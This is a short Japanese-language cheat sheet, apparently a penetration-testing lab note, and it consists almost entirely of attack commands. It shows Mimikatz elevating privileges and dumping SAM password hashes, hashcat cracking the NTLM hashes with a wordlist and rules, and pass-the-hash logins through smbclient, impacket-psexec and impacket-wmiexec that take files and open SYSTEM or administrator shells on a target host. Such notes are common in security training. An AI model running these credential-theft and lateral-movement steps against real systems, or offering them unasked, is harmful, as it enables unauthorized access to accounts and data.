# パスワードの抽出
```Powershell
# ローカルユーザの特定
Get-localuser

.\mimikatz.exe

# sekurlsa::logonpasswordsとlsadump::samに対して SeDebugPrivilege アクセス権を有効にする
privilege::debug

# SYSTEMユーザー権限に昇格
token::elevate

lsadump::sam
# ハッシュが出力される
```

# 解析
```bash
# 出力されたハッシュをnelly.hashにコピーしファイルを作成しておく

hashcat --help | grep -i "ntlm"
# 1000 | NTLM    | Operating System

hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
---
# Passing NTLM
Pass-the-Hash （PtH）技術を使用し、NTLMハッシュを解析せずに使う
## 抽出
```Powershell
.\mimikatz.exe

privilege::debug
token::elevate
lsadump::sam
# hashが出力される
```

## 接続
### smbclient
```bash
smbclient \\\\192.168.248.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

dir
get secret.txt
```

### impacket-psexec
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.248.212

hostname
ipconfig
whoami
# psexec.py の性質上、認証に使用したユーザーではなく、常に SYSTEM としてシェルが取得され
exit
```

### impacket-wmiexec
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.248.212

whoami
# SYSTEMではなくwmiexecを使用して管理者ユーザーとしてシェルを取得
```
